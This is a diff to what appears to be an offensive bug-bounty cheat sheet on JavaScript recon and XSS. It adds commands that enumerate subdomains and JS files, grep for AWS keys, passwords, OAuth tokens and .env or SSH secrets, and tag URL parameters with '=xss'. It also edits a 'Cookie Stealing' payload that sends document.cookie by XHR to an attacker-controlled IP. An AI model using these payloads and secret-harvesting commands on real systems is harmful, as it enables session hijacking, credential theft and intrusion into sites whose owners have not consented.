@@ -15,11 +15,28 @@ echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type 
 ```
 
 
+## Find and Extract JS file
+```bash
+subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
+
+```
+> In summary, this command sequence combines various tools (subfinder, httpx, waybackurls, and grep) to find subdomains, retrieve historical URLs, filter JavaScript files, and save the results in separate files (subdomains.txt and js.txt).
+
+
+
 ## Extract API endpoints from javascript files
 ```bash
 cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
 
 ```
+
+## Searching in JS files
+```bash
+grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js
+
+```
+> Make sure to replace `/path/to/directory` with the actual path to the directory where your .js files are located. The command will recursively search for the specified keywords in all .js files within that directory.
+
 
 
 ## Find hidden GET parameters in javascript files
@@ -33,13 +50,9 @@ Here’s an interesting tip for finding hidden parameters by analyzing javascrip
 
 **This often results in XSS!**
 ```bash
-assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
+assetfinder target.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 
 ```
-
-
-
-
 
 
 ## Cookie Stealing
@@ -98,7 +111,7 @@ httpd.serve_forever()
 * Via XHR
 ```javascript
 var xhr=new XMLHttpRequest(); 
-xhr.open("GET", "https://10.10.14.8/?"+document.cookie, true); 
+xhr.open("GET", "https://192.168.0.18/?"+document.cookie, true); 
 xhr.send();
 
 ```
